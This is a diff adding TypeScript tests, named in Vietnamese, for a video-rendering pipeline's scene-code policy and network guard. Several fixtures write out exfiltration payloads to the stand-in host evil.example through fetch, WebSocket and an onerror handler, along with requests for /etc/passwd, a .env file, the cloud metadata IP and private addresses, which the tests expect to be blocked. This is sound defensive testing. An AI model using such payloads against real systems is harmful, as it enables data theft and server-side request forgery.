@@ -309,4 +309,90 @@ describe('Module 6: HTML & GSAP Packaging (src/pipeline/assembleHtml.ts)', () =>
             assert.strictEqual(assembleCode, assembleHTML);
         });
     });
+
+    describe('TC-ASM-SEC: Chính sách mã scene + network guard (chặn egress ở tầng render)', () => {
+        it('từ chối jsCode chứa fetch()', async () => {
+            const bad: videoScript = {
+                ...mockScript,
+                scenes: [{ ...mockScene, jsCode: 'fetch("https://evil.example/x?d=" + document.title);' }],
+            };
+            await assert.rejects(
+                () => assembleHTML(bad, sampleDurations, 640, 360, testTempDir),
+                /Scene code policy violated/
+            );
+        });
+
+        it('từ chối globalSetupJs chứa WebSocket và jsCode chứa eval()', async () => {
+            const badWs: videoScript = { ...mockScript, globalSetupJs: 'new WebSocket("wss://evil.example");' };
+            await assert.rejects(
+                () => assembleHTML(badWs, sampleDurations, 640, 360, testTempDir),
+                /NETWORK_WEBSOCKET/
+            );
+            const badEval: videoScript = {
+                ...mockScript,
+                scenes: [{ ...mockScene, jsCode: 'eval("alert(1)");' }],
+            };
+            await assert.rejects(
+                () => assembleHTML(badEval, sampleDurations, 640, 360, testTempDir),
+                /DYNAMIC_EVAL/
+            );
+        });
+
+        it('từ chối script nhúng trong htmlCode chứa XMLHttpRequest và handler inline chứa fetch', async () => {
+            const badScript: videoScript = {
+                ...mockScript,
+                scenes: [{ ...mockScene, htmlCode: '<div>x</div><script>var x = new XMLHttpRequest();</script>' }],
+            };
+            await assert.rejects(
+                () => assembleHTML(badScript, sampleDurations, 640, 360, testTempDir),
+                /NETWORK_XHR/
+            );
+            const badHandler: videoScript = {
+                ...mockScript,
+                scenes: [{ ...mockScene, htmlCode: '<img src="x" onerror="fetch(\'https://evil.example\')">' }],
+            };
+            await assert.rejects(
+                () => assembleHTML(badHandler, sampleDurations, 640, 360, testTempDir),
+                /NETWORK_FETCH/
+            );
+        });
+
+        it('không báo nhầm khi chuỗi văn bản chỉ nhắc tên API trong chuỗi/comment', async () => {
+            const ok: videoScript = {
+                ...mockScript,
+                scenes: [{ ...mockScene, jsCode: 'console.log("khong dung fetch() o day"); // WebSocket chi la chu thich' }],
+            };
+            const res = await assembleHTML(ok, sampleDurations, 640, 360, testTempDir);
+            assert.ok(res.htmlContent.length > 0);
+        });
+
+        it('network guard: ma trận quyết định theo URL + loại tài nguyên', async () => {
+            const { decideRequestAllowed } = await import('../../src/pipeline/networkGuard.js');
+            const jobRoot = join(testTempDir, 'job-abc');
+            const opts = { fileRoots: [jobRoot] };
+
+            // file:// trong thư mục job được phép; ngoài thư mục thì chặn
+            assert.equal(decideRequestAllowed(`file://${join(jobRoot, 'index.html')}`, 'document', opts).allowed, true);
+            assert.equal(decideRequestAllowed('file:///etc/passwd', 'fetch', opts).allowed, false);
+            assert.equal(decideRequestAllowed('file:///home/khxnh/.env', 'fetch', opts).allowed, false);
+
+            // SSRF loopback/private qua http/https đều chặn
+            assert.equal(decideRequestAllowed('http://127.0.0.1:3000/api/jobs', 'fetch', opts).allowed, false);
+            assert.equal(decideRequestAllowed('https://169.254.169.254/latest/meta-data/', 'fetch', opts).allowed, false);
+            assert.equal(decideRequestAllowed('https://192.168.1.7:6379/', 'fetch', opts).allowed, false);
+
+            // Exfil qua fetch tới host ngoài không nằm trong allowlist: chặn
+            assert.equal(decideRequestAllowed('https://evil.example/collect', 'fetch', opts).allowed, false);
+            assert.equal(decideRequestAllowed('https://evil.example/collect', 'ping', opts).allowed, false);
+            // Tài nguyên tĩnh công khai được phép; CDN trong allowlist được fetch
+            assert.equal(decideRequestAllowed('https://upload.wikimedia.org/img.jpg', 'image', opts).allowed, true);
+            assert.equal(decideRequestAllowed('https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js', 'script', opts).allowed, true);
+            assert.equal(decideRequestAllowed('https://fonts.googleapis.com/css2?family=Inter', 'stylesheet', opts).allowed, true);
+            assert.equal(decideRequestAllowed('https://cdnjs.cloudflare.com/x', 'fetch', opts).allowed, true);
+
+            // data URI + websocket
+            assert.equal(decideRequestAllowed('data:image/png;base64,AAAA', 'image', opts).allowed, true);
+            assert.equal(decideRequestAllowed('wss://evil.example/socket', 'websocket', opts).allowed, false);
+        });
+    });
 });
